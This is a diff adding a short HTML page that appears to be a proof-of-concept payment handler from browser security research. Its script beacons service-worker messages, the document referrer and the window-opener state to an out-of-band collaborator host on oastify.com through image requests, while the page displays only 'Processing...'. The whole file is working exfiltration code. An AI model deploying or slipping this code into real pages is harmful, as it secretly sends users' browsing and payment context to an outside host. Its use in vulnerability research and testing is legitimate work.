@@ -1,0 +1,23 @@
+  <!DOCTYPE html>
+  <html>
+  <script>
+  const OOB = 'https://n6u4chbqezxncoq47ydz4ge9q0wrkh86.oastify.com';
+
+  // Receive context from SW
+  navigator.serviceWorker.addEventListener('message', e => {
+    new Image().src = OOB + '/handler_msg?d=' +
+      encodeURIComponent(JSON.stringify(e.data));
+  });
+
+  // Also log our own context
+  new Image().src = OOB + '/handler_loaded?ref=' +
+    encodeURIComponent(document.referrer) +
+    '&opener=' + (window.opener ? 'yes' : 'no');
+
+  // Complete the payment (required or browser hangs)
+  if (window.PaymentRequestEvent) {
+    // Already handled via SW respondWith
+  }
+  </script>
+  <body>Processing...</body>
+  </html>
